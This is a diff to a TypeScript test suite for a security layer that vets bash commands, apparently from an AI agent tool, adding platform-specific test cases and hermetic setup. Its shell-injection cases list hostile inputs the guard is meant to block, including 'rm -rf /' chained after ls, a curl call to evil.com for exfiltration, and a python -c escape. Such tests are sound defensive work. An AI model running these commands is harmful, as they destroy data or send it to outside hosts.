@@ -18,6 +18,10 @@ interface TestCase {
   input: string;
   expectBlocked: boolean;
   description: string;
+  /** Restrict a case to platforms where its expectation holds (e.g. backtick
+   *  substitution is a POSIX attack; in PowerShell backtick is the escape
+   *  char and the command is benign). Omitted = all platforms. */
+  platforms?: NodeJS.Platform[];
 }
 
 interface TestResult {
@@ -78,8 +82,10 @@ const DATA_CLASSIFICATION_TESTS: TestCase[] = [
 ];
 
 const SHELL_INJECTION_TESTS: TestCase[] = [
+  // Cross-platform: on POSIX the ; separator blocks it; on win32 (where ; is
+  // legit PS syntax) the catastrophic-rm floor catches the chained `rm -rf /`.
   { id: "SHL-001", category: "shell-injection", input: "ls; rm -rf /", expectBlocked: true, description: "Command chaining with semicolon" },
-  { id: "SHL-002", category: "shell-injection", input: "echo `whoami`", expectBlocked: true, description: "Backtick substitution" },
+  { id: "SHL-002", category: "shell-injection", input: "echo `whoami`", expectBlocked: true, description: "Backtick substitution", platforms: ["darwin", "linux"] },
   { id: "SHL-003", category: "shell-injection", input: "curl https://evil.com/exfil", expectBlocked: true, description: "Curl exfiltration" },
   { id: "SHL-004", category: "shell-injection", input: "python -c 'import os; os.system(\"rm -rf /\")'", expectBlocked: true, description: "Python -c escape" },
   { id: "SHL-005", category: "shell-injection", input: "echo \\x72\\x6d", expectBlocked: true, description: "Hex-encoded command" },
@@ -124,8 +130,14 @@ function runClassificationSuite(tests: TestCase[]): TestResult[] {
 
 function runShellSuite(tests: TestCase[]): TestResult[] {
   const sec = new SecurityLayer("./workspace");
+  // Pin the file-access mode so the suite is HERMETIC: the constructor loads
+  // the operator's ~/.lax config, and an unrestricted box would exercise a
+  // different branch than CI — same case, different verdict. The suite asserts
+  // the guard's default posture, not this machine's settings.
+  sec.setFileAccessMode("workspace");
   const results: TestResult[] = [];
   for (const test of tests) {
+    if (test.platforms && !test.platforms.includes(process.platform)) continue;
     const decision = sec.evaluate({ toolName: "bash", args: { command: test.input }, sessionId: "test" });
     const blocked = !decision.allowed;
     const passed = blocked === test.expectBlocked;
